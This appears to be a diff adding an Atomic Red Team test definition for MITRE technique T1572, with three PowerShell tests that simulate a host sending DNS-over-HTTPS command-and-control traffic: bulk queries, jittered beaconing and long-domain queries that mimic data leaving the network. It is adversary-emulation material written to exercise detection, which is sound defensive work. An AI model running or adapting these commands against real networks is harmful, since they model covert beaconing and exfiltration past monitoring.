@@ -1,0 +1,108 @@
+attack_technique: T1572
+display_name: 'Protocol Tunneling'
+atomic_tests:
+- name: DNS over HTTPS Large Query Volume
+  auto_generated_guid: ae9ef4b0-d8c1-49d4-8758-06206f19af0a
+  description: |
+    This test simulates an infected host sending a large volume of DoH queries to a command and control server.
+    The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
+    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+  supported_platforms:
+  - windows
+  input_arguments:
+    doh_server:
+      description: Default DoH resolver
+      type: String
+      default: https://8.8.8.8/resolve
+    query_type:
+      description: DNS query type
+      type: String
+      default: TXT
+    subdomain:
+      description: Subdomain prepended to the domain name
+      type: String
+      default: atomicredteam
+    query_volume:
+      description: Number of DNS queries to send
+      type: Integer
+      default: "1000"
+    domain:
+      description: Default domain to simulate against
+      type: String
+      default: 127.0.0.1.xip.io
+  executor:
+    command: |
+      for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content }
+    name: powershell
+- name: DNS over HTTPS Regular Beaconing
+  auto_generated_guid: 0c5f9705-c575-42a6-9609-cbbff4b2fc9b
+  description: |
+    This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
+    This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+    A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+  supported_platforms:
+  - windows
+  input_arguments:
+    doh_server:
+      description: Default DoH resolver
+      type: String
+      default: https://8.8.8.8/resolve
+    runtime:
+      description: Time in minutes to run the simulation
+      type: Integer
+      default: 30
+    domain:
+      description: Default domain to simulate against
+      type: String
+      default: 127.0.0.1.xip.io
+    subdomain:
+      description: Subdomain prepended to the domain name
+      type: String
+      default: atomicredteam
+    query_type:
+      description: DNS query type
+      type: String
+      default: TXT
+    c2_interval:
+      description: Seconds between C2 requests to the command and control server
+      type: Integer
+      default: 30
+    c2_jitter:
+      description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests
+      type: Integer
+      default: 20
+  executor:
+    command: |
+      Set-Location PathToAtomicsFolder
+      .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
+    name: powershell
+- name: DNS over HTTPS Long Domain Query
+  auto_generated_guid: 748a73d5-cea4-4f34-84d8-839da5baa99c
+  description: |
+    This test simulates an infected host returning data to a command and control server using long domain names.
+    The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
+     Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+  supported_platforms:
+  - windows
+  input_arguments:
+    doh_server:
+      description: Default DoH resolver
+      type: String
+      default: https://8.8.8.8/resolve
+    query_type:
+      description: DNS query type
+      type: String
+      default: TXT
+    subdomain:
+      description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)
+      type: String
+      default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+    domain:
+      description: Default domain to simulate against
+      type: String
+      default: 127.0.0.1.xip.io
+  executor:
+    command: |
+      Set-Location PathToAtomicsFolder
+      .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+    name: powershell
